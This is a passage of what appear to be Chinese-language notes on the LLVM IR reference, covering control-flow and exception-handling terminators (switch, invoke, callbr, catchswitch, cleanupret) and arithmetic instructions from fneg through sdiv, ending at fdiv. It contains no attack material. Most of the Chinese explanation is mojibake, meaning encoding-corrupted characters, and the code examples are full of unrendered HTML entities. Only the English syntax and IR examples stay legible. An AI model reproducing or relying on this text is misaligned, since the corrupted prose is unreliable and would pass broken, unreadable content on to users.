IfUnequal: ret i32 0 switch å¤šæ¡ä»¶åˆ†æ”¯ å¤šæ¡ä»¶åˆ†æ”¯ Syntax: switch &lt;intty&gt; &lt;value&gt;, label &lt;defaultdest&gt; [ &lt;intty&gt; &lt;val&gt;, label &lt;dest&gt; ... ] Arguments: â€œswitchâ€æŒ‡ä»¤ä½¿ç”¨ä¸‰ä¸ªå‚æ•°ï¼šä¸€ä¸ªæ•´æ•°æ¯”è¾ƒå€¼â€œvalueâ€ï¼Œä¸€ä¸ªé»˜è®¤çš„â€œlabelâ€ç›®çš„åœ°ï¼Œä»¥åŠä¸€ä¸ªç”±æˆå¯¹çš„æ¯”è¾ƒå€¼å¸¸é‡å’Œâ€œlabelâ€ç»„æˆçš„æ•°ç»„ã€‚ è¯¥è¡¨ä¸å…è®¸åŒ…å«é‡å¤çš„å¸¸é‡æ¡ç›®ã€‚ Semantics: switch æŒ‡ä»¤æŒ‡å®šäº†ä¸€ä¸ªå€¼å’Œç›®æ ‡è¡¨ã€‚ å½“æ‰§è¡Œâ€™switchâ€™æŒ‡ä»¤æ—¶ï¼Œå°†åœ¨è¯¥è¡¨ä¸­æœç´¢ç»™å®šå€¼ã€‚ å¦‚æœæ‰¾åˆ°è¯¥å€¼ï¼Œåˆ™å°†æ§åˆ¶æµè½¬ç§»åˆ°ç›¸åº”çš„ç›®çš„åœ°ï¼› å¦åˆ™ï¼Œæ§åˆ¶æµå°†è½¬ç§»åˆ°é»˜è®¤ç›®çš„åœ°ã€‚ å¦‚æœâ€œvalueâ€æ˜¯â€œpoisonâ€æˆ–â€œundefâ€ï¼Œåˆ™è¯¥æŒ‡ä»¤å…·æœ‰æœªå®šä¹‰çš„è¡Œä¸ºã€‚ Example: ; Emulate a conditional br instruction %Val &#x3D; zext i1 %value to i32 switch i32 %Val, label %truedest [ i32 0, label %falsedest ] ; Emulate an unconditional br instruction switch i32 0, label %dest [ ] ; Implement a jump table: switch i32 %val, label %otherwise [ i32 0, label %onzero i32 1, label %onone i32 2, label %ontwo ] indirectbr è½¬ç§»åˆ°æŒ‡å®šåœ°å€ è½¬ç§»åˆ°åœ°å€å‚æ•°ä¸­æŒ‡å®šçš„å— Syntax: indirectbr &lt;somety&gt;* &lt;address&gt;, [ label &lt;dest1&gt;, label &lt;dest2&gt;, ... ] Overview: â€œindirectbrâ€æŒ‡ä»¤å®ç°äº†åˆ°å½“å‰å‡½æ•°å†…æ ‡ç­¾çš„é—´æ¥åˆ†æ”¯ï¼Œå…¶åœ°å€ç”±â€œaddressâ€æŒ‡å®šã€‚ åœ°å€å¿…é¡»ä» blockaddress å¸¸é‡æ´¾ç”Ÿã€‚ Arguments: â€œåœ°å€â€å‚æ•°æ˜¯è¦è·³è½¬åˆ°çš„æ ‡ç­¾çš„åœ°å€ã€‚ å…¶ä½™å‚æ•°è¡¨ç¤ºåœ°å€å¯èƒ½æŒ‡å‘çš„å…¨éƒ¨å¯èƒ½ç›®çš„åœ°ã€‚ å…è®¸åœ¨ç›®æ ‡åˆ—è¡¨ä¸­å¤šæ¬¡å‡ºç°å—ï¼Œä½†è¿™å¹¶ä¸æ˜¯ç‰¹åˆ«æœ‰ç”¨ã€‚ æ­¤ç›®æ ‡åˆ—è¡¨æ˜¯å¿…éœ€çš„ï¼Œä»¥ä¾¿æ•°æ®æµåˆ†æèƒ½å¤Ÿå‡†ç¡®äº†è§£ CFGã€‚ Semantics: æ§åˆ¶è½¬ç§»åˆ°åœ°å€å‚æ•°ä¸­æŒ‡å®šçš„å—ã€‚ æ‰€æœ‰å¯èƒ½çš„ç›®æ ‡å—å¿…é¡»åˆ—åœ¨æ ‡ç­¾åˆ—è¡¨ä¸­ï¼Œå¦åˆ™è¯¥æŒ‡ä»¤å…·æœ‰æœªå®šä¹‰çš„è¡Œä¸ºã€‚ è¿™æ„å‘³ç€è·³è½¬åˆ°å…¶ä»–å‡½æ•°ä¸­å®šä¹‰çš„æ ‡ç­¾ä¹Ÿå…·æœ‰æœªå®šä¹‰çš„è¡Œä¸º å¦‚æœaddressæ˜¯ poison æˆ– undef, åˆ™è¯¥æŒ‡ä»¤å…·æœ‰æœªå®šä¹‰çš„è¡Œä¸ºã€‚ Implementation: è¿™é€šå¸¸é€šè¿‡ä¸€ä¸ªå¯„å­˜å™¨è·³è½¬æ¥å®ç°ã€‚ Example: indirectbr i8* %Addr, [ label %bb1, label %bb2, label %bb3 ] invoke æ™®é€š/å¸¦å¼‚å¸¸è°ƒç”¨ æ™®é€š/å¸¦å¼‚å¸¸è°ƒç”¨ Syntax: &lt;result&gt; &#x3D; invoke [cconv] [ret attrs] [addrspace(&lt;num&gt;)] &lt;ty&gt;|&lt;fnty&gt; &lt;fnptrval&gt;(&lt;function args&gt;) [fn attrs] [operand bundles] to label &lt;normal label&gt; unwind label &lt;exception label&gt; Overview: å¦‚æœè¢«è°ƒç”¨å‡½æ•°è¿”å›â€œretâ€æŒ‡ä»¤ï¼Œæ§åˆ¶æµå°†è¿”å›â€œnormalâ€æ ‡ç­¾ã€‚ å¦‚æœè¢«è°ƒç”¨è€…ï¼ˆæˆ–ä»»ä½•é—´æ¥è¢«è°ƒç”¨è€…ï¼‰é€šè¿‡â€œresumeâ€æŒ‡ä»¤æˆ–å…¶ä»–å¼‚å¸¸å¤„ç†æœºåˆ¶è¿”å›ï¼Œåˆ™æ§åˆ¶è¢«ä¸­æ–­å¹¶ç»§ç»­åœ¨ åŠ¨æ€æœ€è¿‘çš„â€œexceptionâ€æ ‡ç­¾ã€‚ Arguments: è¯¥æŒ‡ä»¤éœ€è¦å‡ ä¸ªå‚æ•°ï¼š å¯é€‰çš„cconvæ ‡è®°æŒ‡ç¤ºè°ƒç”¨åº”è¯¥ä½¿ç”¨å“ªä¸ªè°ƒç”¨çº¦å®šã€‚å¦‚æœæœªæŒ‡å®šï¼Œåˆ™è°ƒç”¨é»˜è®¤ä½¿ç”¨ C è°ƒç”¨çº¦å®šã€‚ è¿”å›å€¼çš„å¯é€‰å‚æ•°å±æ€§åˆ—è¡¨ã€‚åªæœ‰zeroext,signextå’Œinregå±æ€§åœ¨è¿™é‡Œæ˜¯æœ‰æ•ˆçš„ã€‚ å¯é€‰çš„addrspaceå±æ€§å¯ä»¥ç”¨æ¥è¡¨ç¤ºè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ç©ºé—´ã€‚å¦‚æœæœªæŒ‡å®šï¼Œå°†ä½¿ç”¨ datalayout string ä¸­çš„ç¨‹åºåœ°å€ç©ºé—´ã€‚ tyï¼šè°ƒç”¨æŒ‡ä»¤æœ¬èº«çš„ç±»å‹ï¼Œä¹Ÿæ˜¯è¿”å›å€¼çš„ç±»å‹ã€‚ä¸è¿”å›å€¼çš„å‡½æ•°è¢«æ ‡è®°ä¸ºâ€œvoidâ€ã€‚ fntyï¼šåº”è¯¥æ˜¯è¢«è°ƒç”¨å‡½æ•°çš„ç­¾åã€‚å‚æ•°ç±»å‹å¿…é¡»ä¸æ­¤ç­¾åæ‰€æš—ç¤ºçš„ç±»å‹ç›¸åŒ¹é…ã€‚å¦‚æœå‡½æ•°ä¸æ˜¯å¯å˜å‚æ•°ï¼Œåˆ™å¯ä»¥çœç•¥æ­¤ç±»å‹ã€‚ fnptrvalï¼šä¸€ä¸ª LLVM å€¼ï¼ŒåŒ…å«ä¸€ä¸ªæŒ‡å‘è¦è°ƒç”¨çš„å‡½æ•°çš„æŒ‡é’ˆã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªç›´æ¥çš„å‡½æ•°è°ƒç”¨ï¼Œä½†é—´æ¥çš„invokeä¹Ÿæ˜¯å°½å¯èƒ½çš„ï¼Œè°ƒç”¨ä¸€ä¸ªæŒ‡å‘å‡½æ•°å€¼çš„ä»»æ„æŒ‡é’ˆã€‚ function argsï¼šç±»å‹ä¸å‡½æ•°ç­¾åå‚æ•°ç±»å‹å’Œå‚æ•°å±æ€§åŒ¹é…çš„å‚æ•°åˆ—è¡¨ã€‚æ‰€æœ‰å‚æ•°å¿…é¡»æ˜¯ first class ç±»å‹ã€‚å¦‚æœå‡½æ•°ç­¾åè¡¨æ˜å‡½æ•°æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œåˆ™å¯ä»¥æŒ‡å®šé¢å¤–çš„å‚æ•°ã€‚ normal labelï¼šè¢«è°ƒç”¨å‡½æ•°æ‰§è¡ŒretæŒ‡ä»¤æ—¶åˆ°è¾¾çš„æ ‡ç­¾ã€‚ exception labelï¼šè¢«è°ƒç”¨è€…é€šè¿‡resumeæŒ‡ä»¤æˆ–å…¶ä»–å¼‚å¸¸å¤„ç†æœºåˆ¶è¿”å›æ—¶åˆ°è¾¾çš„æ ‡ç­¾ã€‚ å¯é€‰çš„å‡½æ•°å±æ€§åˆ—è¡¨ã€‚ å¯é€‰çš„æ“ä½œæ•°åŒ…åˆ—è¡¨ã€‚ Semantics: åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯¥æŒ‡ä»¤æ—¨åœ¨ä½œä¸ºæ ‡å‡†çš„callæŒ‡ä»¤è¿è¡Œã€‚ ä¸»è¦åŒºåˆ«åœ¨äºå®ƒå»ºç«‹äº†ä¸æ ‡ç­¾çš„å…³è”ï¼Œè¿è¡Œæ—¶åº“ä½¿ç”¨è¯¥æ ‡ç­¾æ¥å±•å¼€å †æ ˆã€‚ Example: %retval &#x3D; invoke i32 @Test(i32 15) to label %Continue unwind label %TestCleanup ; i32:retval set %retval &#x3D; invoke coldcc i32 %Testfnptr(i32 15) to label %Continue unwind label %TestCleanup ; i32:retval set callbr è°ƒç”¨åˆ†æ”¯ Syntax: &lt;result&gt; &#x3D; callbr [cconv] [ret attrs] [addrspace(&lt;num&gt;)] &lt;ty&gt;|&lt;fnty&gt; &lt;fnptrval&gt;(&lt;function args&gt;) [fn attrs] [operand bundles] to label &lt;fallthrough label&gt; [indirect labels] Overview: â€˜callbrâ€™æŒ‡ä»¤ä½¿æ§åˆ¶è½¬ç§»åˆ°æŒ‡å®šçš„å‡½æ•°. å¯ä»¥æ§åˆ¶æµä¼ è¾“åˆ°â€˜fallthroughâ€™ æ ‡ç­¾æˆ–indirectâ€™æ ‡ç­¾ä¹‹ä¸€ã€‚ è¯¥æŒ‡ä»¤ä»…ç”¨äºå®ç° gcc æ ·å¼å†…è”æ±‡ç¼–çš„gotoç‰¹æ€§ã€‚ ä»»ä½•å…¶ä»–ç”¨æ³•éƒ½æ˜¯ IR éªŒè¯ç¨‹åºä¸­çš„é”™è¯¯ã€‚ Arguments: è¯¥æŒ‡ä»¤éœ€è¦å‡ ä¸ªå‚æ•°ï¼š å¯é€‰çš„cconvæ ‡è®°æŒ‡ç¤ºè°ƒç”¨åº”è¯¥ä½¿ç”¨å“ªä¸ªè°ƒç”¨çº¦å®šã€‚å¦‚æœæœªæŒ‡å®šï¼Œåˆ™è°ƒç”¨é»˜è®¤ä½¿ç”¨ C è°ƒç”¨çº¦å®šã€‚ è¿”å›å€¼çš„å¯é€‰å‚æ•°å±æ€§åˆ—è¡¨ã€‚åªæœ‰zeroext,signextå’Œinregå±æ€§åœ¨è¿™é‡Œæ˜¯æœ‰æ•ˆçš„ã€‚ å¯é€‰çš„addrspaceå±æ€§å¯ä»¥ç”¨æ¥è¡¨ç¤ºè¢«è°ƒç”¨å‡½æ•°çš„åœ°å€ç©ºé—´ã€‚å¦‚æœæœªæŒ‡å®šï¼Œå°†ä½¿ç”¨ datalayout string ä¸­çš„ç¨‹åºåœ°å€ç©ºé—´ã€‚ tyï¼šè°ƒç”¨æŒ‡ä»¤æœ¬èº«çš„ç±»å‹ï¼Œä¹Ÿæ˜¯è¿”å›å€¼çš„ç±»å‹ã€‚ä¸è¿”å›å€¼çš„å‡½æ•°è¢«æ ‡è®°ä¸ºâ€œvoidâ€ã€‚ fntyï¼šåº”è¯¥æ˜¯è¢«è°ƒç”¨å‡½æ•°çš„ç­¾åã€‚å‚æ•°ç±»å‹å¿…é¡»ä¸æ­¤ç­¾åæ‰€æš—ç¤ºçš„ç±»å‹ç›¸åŒ¹é…ã€‚å¦‚æœå‡½æ•°ä¸æ˜¯å¯å˜å‚æ•°ï¼Œåˆ™å¯ä»¥çœç•¥æ­¤ç±»å‹ã€‚ fnptrvalï¼šä¸€ä¸ª LLVM å€¼ï¼ŒåŒ…å«ä¸€ä¸ªæŒ‡å‘è¦è°ƒç”¨çš„å‡½æ•°çš„æŒ‡é’ˆã€‚åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¿™æ˜¯ä¸€ä¸ªç›´æ¥çš„å‡½æ•°è°ƒç”¨ï¼Œä½†é—´æ¥çš„invokeä¹Ÿæ˜¯å°½å¯èƒ½çš„ï¼Œè°ƒç”¨ä¸€ä¸ªæŒ‡å‘å‡½æ•°å€¼çš„ä»»æ„æŒ‡é’ˆã€‚ â€˜function argsï¼šç±»å‹ä¸å‡½æ•°ç­¾åå‚æ•°ç±»å‹å’Œå‚æ•°å±æ€§åŒ¹é…çš„å‚æ•°åˆ—è¡¨ã€‚æ‰€æœ‰å‚æ•°å¿…é¡»æ˜¯ first class ç±»å‹ã€‚å¦‚æœå‡½æ•°ç­¾åè¡¨æ˜å‡½æ•°æ¥å—å¯å˜æ•°é‡çš„å‚æ•°ï¼Œåˆ™å¯ä»¥æŒ‡å®šé¢å¤–çš„å‚æ•°ã€‚ â€˜fallthrough labelâ€™: å†…è”æ±‡ç¼–æ‰§è¡Œé€€å‡ºåº•éƒ¨æ—¶åˆ°è¾¾çš„æ ‡ç­¾ã€‚ â€˜indirect labelsâ€™: å½“è¢«è°ƒç”¨è€…å°†æ§åˆ¶æƒè½¬ç§»åˆ°fallthrough labelä»¥å¤–çš„ä½ç½®æ—¶åˆ°è¾¾çš„æ ‡ç­¾ã€‚ è¿™äº›çš„å—åœ°å€å¸¸é‡ä¹Ÿåº”è¯¥åœ¨function argsåˆ—è¡¨ä¸­ã€‚ å¯é€‰çš„å‡½æ•°å±æ€§åˆ—è¡¨ã€‚ å¯é€‰çš„æ“ä½œæ•°åŒ…åˆ—è¡¨ã€‚ Semantics: åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œè¯¥æŒ‡ä»¤æ—¨åœ¨ä½œä¸ºæ ‡å‡†çš„â€œè°ƒç”¨â€æŒ‡ä»¤è¿è¡Œã€‚ ä¸»è¦åŒºåˆ«åœ¨äºå®ƒå»ºç«‹äº†ä¸é™„åŠ æ ‡ç­¾çš„å…³è”ï¼Œä»¥å®šä¹‰æ§åˆ¶æµåœ¨è°ƒç”¨ä¹‹åçš„å»å‘ã€‚ callbræŒ‡ä»¤çš„è¾“å‡ºå€¼åªå¯¹fallthroughâ€™å—æœ‰æ•ˆï¼Œå¯¹ä»»ä½•â€˜indirectâ€™å—æ— æ•ˆã€‚ è¿™æ ·åšçš„å”¯ä¸€ç”¨é€”æ˜¯å®ç° gcc å†…è”æ±‡ç¼–çš„â€œgotoâ€åŠŸèƒ½ï¼Œå…¶ä¸­å¯ä»¥æä¾›é¢å¤–çš„æ ‡ç­¾ä½œä¸ºå†…è”æ±‡ç¼–è·³è½¬åˆ°çš„ä½ç½®ã€‚ Example: ; &quot;asm goto&quot; without output constraints. callbr void asm &quot;&quot;, &quot;r,X&quot;(i32 %x, i8 *blockaddress(@foo, %indirect)) to label %fallthrough [label %indirect] ; &quot;asm goto&quot; with output constraints. &lt;result&gt; &#x3D; callbr i32 asm &quot;&quot;, &quot;&#x3D;r,r,X&quot;(i32 %x, i8 *blockaddress(@foo, %indirect)) to label %fallthrough [label %indirect] resume æŠ›å‡ºå¼‚å¸¸ æŠ›å‡ºå¼‚å¸¸ Syntax: resume &lt;type&gt; &lt;value&gt; Overview: resumeæŒ‡ä»¤æ˜¯æ²¡æœ‰åç»§çš„ç»ˆæ­¢æŒ‡ä»¤ã€‚ Arguments: â€œresumeâ€æŒ‡ä»¤éœ€è¦ä¸€ä¸ªå‚æ•°ï¼Œè¯¥å‚æ•°å¿…é¡»ä¸åŒä¸€å‡½æ•°ä¸­ä»»ä½•â€œlandingpadâ€æŒ‡ä»¤çš„ç»“æœç±»å‹ç›¸åŒã€‚ Semantics: resumeæŒ‡ä»¤æ¢å¤ä¸€ä¸ªç°æœ‰ï¼ˆè¿›è¡Œä¸­ï¼‰å¼‚å¸¸çš„ä¼ æ’­ï¼Œè¯¥å¼‚å¸¸çš„å±•å¼€è¢« landingpad æŒ‡ä»¤ä¸­æ–­ã€‚ Example: resume &#123; i8*, i32 &#125; %exn catchswitch å¼‚å¸¸å¤„ç† LLVMå¼‚å¸¸å¤„ç† Syntax: &lt;resultval&gt; &#x3D; catchswitch within &lt;parent&gt; [ label &lt;handler1&gt;, label &lt;handler2&gt;, ... ] unwind to caller &lt;resultval&gt; &#x3D; catchswitch within &lt;parent&gt; [ label &lt;handler1&gt;, label &lt;handler2&gt;, ... ] unwind label &lt;default&gt; Overview: LLVM çš„å¼‚å¸¸å¤„ç†ç³»ç»Ÿ ä½¿ç”¨ â€˜catchswitchâ€™ æŒ‡ä»¤æ¥æè¿°å¯èƒ½ç”± EH ç‰¹æ€§æ‰§è¡Œçš„æ•è·å¤„ç†ç¨‹åºé›† ä¾‹ç¨‹ã€‚ Arguments: parent å‚æ•°æ˜¯åŒ…å« catchswitch æŒ‡ä»¤çš„ funclet çš„æ ‡è®°ã€‚ å¦‚æœ catchswitch ä¸åœ¨ funclet å†…ï¼Œåˆ™æ­¤æ“ä½œæ•°å¯èƒ½æ˜¯æ ‡è®° noneã€‚ default å‚æ•°æ˜¯å¦ä¸€ä¸ªä»¥ cleanuppad æˆ– catchswitch æŒ‡ä»¤å¼€å¤´çš„åŸºæœ¬å—çš„æ ‡ç­¾ã€‚ å¦‚ å¼‚å¸¸å¤„ç†æ–‡æ¡£ ä¸­æ‰€è¿°ï¼Œæ­¤å±•å¼€ç›®æ ‡å¿…é¡»æ˜¯ä¸â€œparentâ€é“¾æ¥ç›¸å…³çš„åˆæ³•ç›®æ ‡ã€‚ handlers æ˜¯ä¸€ä¸ªåç»§å—çš„éç©ºåˆ—è¡¨ï¼Œæ¯ä¸ªåç»§å—éƒ½ä»¥ catchpad æŒ‡ä»¤å¼€å¤´ã€‚ Semantics: æ‰§è¡Œæ­¤æŒ‡ä»¤å°†æ§åˆ¶æƒè½¬ç§»åˆ°handlersä¸­çš„åç»§è€…ä¹‹ä¸€ï¼Œ å¦‚æœåˆé€‚ï¼Œæˆ–é€šè¿‡å±•å¼€æ ‡ç­¾ï¼ˆå¦‚æœå­˜åœ¨ï¼‰ç»§ç»­å±•å¼€ã€‚ catchswitch æ—¢æ˜¯ç»ˆæ­¢ç¬¦åˆæ˜¯ â€œpadâ€ æŒ‡ä»¤ï¼Œè¿™æ„å‘³ç€å®ƒå¿…é¡»æ˜¯åŸºæœ¬å—ä¸­çš„ç¬¬ä¸€æ¡é phi æŒ‡ä»¤å’Œæœ€åä¸€æ¡æŒ‡ä»¤ã€‚ å› æ­¤ï¼Œå®ƒå¿…é¡»æ˜¯å—ä¸­å”¯ä¸€çš„é phi æŒ‡ä»¤ã€‚ Example: dispatch1: %cs1 &#x3D; catchswitch within none [label %handler0, label %handler1] unwind to caller dispatch2: %cs2 &#x3D; catchswitch within %parenthandler [label %handler0] unwind label %cleanup catchret å¤„ç†è¿”å› Syntax: catchret from &lt;token&gt; to label &lt;normal&gt; Overview: catchretæŒ‡ä»¤æ˜¯å…·æœ‰å•ä¸ªåç»§çš„ç»ˆæ­¢æŒ‡ä»¤ã€‚ Arguments: The first argument to a â€˜catchretâ€™ indicates which catchpad it exits. It must be a catchpad. The second argument to a â€˜catchretâ€™ specifies where control will transfer to next. â€˜catchretâ€™ çš„ç¬¬ä¸€ä¸ªå‚æ•°æŒ‡ç¤ºå®ƒé€€å‡ºå“ªä¸ª catchpadã€‚ å®ƒå¿…é¡»æ˜¯ catchpadã€‚ â€˜catchretâ€™ çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šæ§åˆ¶å°†è½¬ç§»åˆ°ä¸‹ä¸€ä¸ªä½ç½®ã€‚ Semantics: â€˜catchretâ€™ æŒ‡ä»¤ç»“æŸä¸€ä¸ªç°æœ‰çš„ï¼ˆæ­£åœ¨è¿›è¡Œçš„ï¼‰å¼‚å¸¸ï¼Œå…¶å±•å¼€è¢« catchpad æŒ‡ä»¤ä¸­æ–­ã€‚ personality function æœ‰æœºä¼šæ‰§è¡Œä»»æ„ä»£ç ï¼Œä¾‹å¦‚é”€æ¯æ´»åŠ¨å¼‚å¸¸ã€‚ ç„¶åæ§åˆ¶è½¬ç§»åˆ° normal. token å‚æ•°å¿…é¡»æ˜¯ç”± catchpad æŒ‡ä»¤ç”Ÿæˆçš„æ ‡è®°ã€‚ å¦‚æœæŒ‡å®šçš„ catchpad ä¸æ˜¯æœ€è¿‘è¾“å…¥çš„å°šæœªé€€å‡ºçš„ funclet padï¼ˆå¦‚ EH æ–‡æ¡£ ä¸­æ‰€è¿°ï¼‰ , catchret çš„è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚ Example: catchret from %catch to label %continue cleanupret Syntax: cleanupret from &lt;value&gt; unwind label &lt;continue&gt; cleanupret from &lt;value&gt; unwind to caller Overview cleanupretæŒ‡ä»¤æ˜¯å…·æœ‰å¯é€‰åç»§çš„ç»ˆæ­¢æŒ‡ä»¤ã€‚ Arguments: cleanupret æŒ‡ä»¤éœ€è¦ä¸€ä¸ªå‚æ•°ï¼ŒæŒ‡ç¤ºå®ƒé€€å‡ºå“ªä¸ª cleanuppadï¼Œå¹¶ä¸”å¿…é¡»æ˜¯ cleanuppadã€‚ å¦‚æœæŒ‡å®šçš„ cleanuppad ä¸æ˜¯æœ€è¿‘è¿›å…¥çš„å°šæœªé€€å‡ºçš„ funclet padï¼ˆå¦‚ EH æ–‡æ¡£ ä¸­æ‰€è¿°ï¼‰ , cleanupret çš„è¡Œä¸ºæ˜¯æœªå®šä¹‰çš„ã€‚ The â€˜cleanupretâ€™ instruction also has an optional successor, continue, which must be the label of another basic block beginning with either a cleanuppad or catchswitch instruction. This unwind destination must be a legal target with respect to the parent links, as described in the exception handling documentation. cleanupretæŒ‡ä»¤è¿˜æœ‰ä¸€ä¸ªå¯é€‰çš„åç»§æŒ‡ä»¤continueï¼Œå®ƒå¿…é¡»æ˜¯å¦ä¸€ä¸ªä»¥cleanuppadæˆ–catchswitchæŒ‡ä»¤å¼€å¤´çš„åŸºæœ¬å—çš„æ ‡ç­¾ã€‚ å¦‚ å¼‚å¸¸å¤„ç†æ–‡æ¡£ ä¸­æ‰€è¿°ï¼Œæ­¤å±•å¼€ç›®æ ‡å¿…é¡»æ˜¯ä¸parenté“¾æ¥ç›¸å…³çš„åˆæ³•ç›®æ ‡ã€‚ Semantics: cleanupretæŒ‡ä»¤å‘ personality function æŒ‡ç¤ºä¸€ä¸ª [cleanuppad](https://llvm.org/docs/LangRef.html #i-cleanuppad) å°†æ§åˆ¶æƒè½¬ç§»åˆ°å·²ç»“æŸã€‚ å®ƒå°†æ§åˆ¶è½¬ç§»åˆ°continueæˆ–é€€å‡ºå‡½æ•°ã€‚ Example: cleanupret from %cleanup unwind to caller cleanupret from %cleanup unwind label %continue unreachable ä¸å¯åˆ°è¾¾ ä¸å¯åˆ°è¾¾ Syntax: unreachable Overview: unreachableæŒ‡ä»¤æ²¡æœ‰å®šä¹‰çš„è¯­ä¹‰ã€‚ è¯¥æŒ‡ä»¤ç”¨äºé€šçŸ¥ä¼˜åŒ–å™¨ä»£ç çš„ç‰¹å®šéƒ¨åˆ†ä¸å¯è®¿é—®ã€‚ è¿™å¯ä»¥ç”¨æ¥è¡¨ç¤ºæ— æ³•åˆ°è¾¾æ— è¿”å›å‡½æ•°ä¹‹åçš„ä»£ç ï¼Œä»¥åŠå…¶ä»–äº‹å®ã€‚ ä¸€å…ƒæ“ä½œ (Unary Operations) fneg æ±‚é€† æ±‚é€† Syntax: &lt;result&gt; &#x3D; fneg [fast-math flags]* &lt;ty&gt; &lt;op1&gt; ; yields ty:result Arguments: fnegæŒ‡ä»¤çš„å‚æ•°å¿…é¡»æ˜¯ floating-point æˆ– [vector](https://llvm.org/ docs/LangRef.html#t-vector) çš„æµ®ç‚¹å€¼ã€‚ &lt;ty&gt; &lt;op1&gt;æ˜¯æ“ä½œæ•°ç±»å‹ï¼Œå¿…é¡»æ˜¯æµ®ç‚¹ç±»å‹æˆ–è€…æµ®ç‚¹å‘é‡ã€‚ Semantics: äº§ç”Ÿçš„å€¼æ˜¯æ“ä½œæ•°çš„å‰¯æœ¬ï¼Œå…¶ç¬¦å·ä½è¢«ç¿»è½¬ã€‚ è¯¥æŒ‡ä»¤è¿˜å¯ä»¥é‡‡ç”¨ä»»æ„æ•°é‡çš„ fast-math flagsï¼Œå®ƒä»¬æ˜¯å¯ç”¨å…¶ä»–ä¸å®‰å…¨æµ®ç‚¹ä¼˜åŒ–çš„ä¼˜åŒ–æç¤ºï¼š Example: &lt;result&gt; &#x3D; fneg float %val ; yields float:result &#x3D; -%var äºŒè¿›åˆ¶æ“ä½œæŒ‡ä»¤(Binary Operations) è¿ç®—\\ç±»å‹ æ— ç¬¦å·æ•´æ•° å¸¦ç¬¦å·æ•´æ•° æµ®ç‚¹æ•° + add fadd - sub fsub * mul fmul / udiv sdiv fdiv % urem srem frem add åŠ  nuw å’Œ nsw åˆ†åˆ«ä»£è¡¨No Unsigned Wrapå’ŒNo Signed Wrapã€‚ å¦‚æœå­˜åœ¨ nuw æˆ–nswå…³é”®å­—ï¼Œåˆ™å¦‚æœåˆ†åˆ«å‘ç”Ÿæ— ç¬¦å·æˆ–æœ‰ç¬¦å·æº¢å‡ºï¼Œåˆ™ add çš„ç»“æœå€¼æ˜¯ poison value ï¼ˆé”™è¯¯å€¼) &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt;ï¼Œä¸¤ä¸ªæ“ä½œæ•°çš„ç±»å‹ç›¸åŒä¸”å¿…é¡»æ˜¯æ•´å‹ç±»å‹æˆ–è€…æ•´å‹å‘é‡ã€‚ #Syntax &lt;result&gt; &#x3D; add &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; add nuw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; add nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; add nuw nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; add i32 4, %var ; yields i32:result &#x3D; 4 + %var fadd æµ®ç‚¹åŠ  #Syntax &lt;result&gt; &#x3D; fadd [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; fadd float 4.0, %var ; yields float:result &#x3D; 4.0 + %var sub å‡ #Syntax &lt;result&gt; &#x3D; sub &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; sub nuw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; sub nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; sub nuw nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; sub i32 4, %var ; yields i32:result &#x3D; 4 - %var &lt;result&gt; &#x3D; sub i32 0, %val ; yields i32:result &#x3D; -%var fsub æµ®ç‚¹å‡ #Syntax &lt;result&gt; &#x3D; fsub [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; fsub float 4.0, %var ; yields float:result &#x3D; 4.0 - %var &lt;result&gt; &#x3D; fsub float -0.0, %val ; yields float:result &#x3D; -%var mul ä¹˜ #Syntax &lt;result&gt; &#x3D; mul &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; mul nuw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; mul nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; mul nuw nsw &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; mul i32 4, %var ; yields i32:result &#x3D; 4 * %var fmul æµ®ç‚¹ä¹˜ #Syntax &lt;result&gt; &#x3D; fmul [fast-math flags]* &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; fmul float 4.0, %var ; yields float:result &#x3D; 4.0 * %var udiv æ— ç¬¦å·æ•´æ•°é™¤ #Syntax &lt;result&gt; &#x3D; udiv &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; udiv exact &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; udiv i32 4, %var ; yields i32:result &#x3D; 4 &#x2F; %var sdiv å¸¦ç¬¦å·æ•´æ•°é™¤ #Syntax &lt;result&gt; &#x3D; sdiv &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result &lt;result&gt; &#x3D; sdiv exact &lt;ty&gt; &lt;op1&gt;, &lt;op2&gt; ; yields ty:result #example &lt;result&gt; &#x3D; sdiv i32 4, %var ; yields i32:result &#x3D; 4 &#x2F; %var fdiv æµ®ç‚¹é™¤ 